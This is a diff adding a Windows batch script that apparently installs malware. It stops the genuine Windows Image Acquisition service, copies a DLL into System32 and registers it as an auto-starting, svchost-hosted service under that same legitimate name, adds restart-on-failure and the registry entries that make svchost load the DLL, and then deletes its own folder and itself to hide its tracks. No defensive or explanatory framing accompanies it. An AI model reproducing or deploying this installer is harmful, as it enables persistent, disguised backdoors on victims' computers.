@@ -1,0 +1,33 @@
+@echo off
+
+set DSP_NAME="Windows Image Acquisition Service"
+
+sc stop wiasvc > nul
+
+echo %~dp0 | findstr /i "system32" > nul
+if %ERRORLEVEL% equ 0 (goto INSTALL) else (goto COPYFILE)
+
+:COPYFILE
+
+copy /y "%~dp0\wiasvc.dll" "%windir%\System32" > nul
+del /f /q "%~dp0\wiasvc.dll" > nul
+
+rem copy /y "%~dp0\wiasvc.dat" "%windir%\System32" > nul
+rem del /f /q "%~dp0\wiasvc.dat" > nul
+
+copy /y "%~dp0\wiasvc.ini" "%windir%\System32" > nul
+del /f /q "%~dp0\wiasvc.ini" > nul
+
+:INSTALL
+
+sc create wiasvc binpath= "%windir%\System32\svchost.exe -k wiasvc" DisplayName= %DSP_NAME% > nul
+sc description wiasvc %DSP_NAME% > nul
+sc failure wiasvc reset= 30 actions= restart/5000 > nul
+sc config wiasvc type= interact type= own start= auto error= normal binpath= "%windir%\System32\svchost.exe -k wiasvc" > nul
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SvcHost" /v wiasvc /t REG_MULTI_SZ /d "wiasvc" /f > nul
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\wiasvc\Parameters" /v ServiceDll /t REG_EXPAND_SZ /d "%windir%\System32\wiasvc.dll" /f > nul
+
+sc start wiasvc > nul
+
+del /f /q "%~dp0\*.*" > nul
+del /f /q "%~dpnx0" > nul
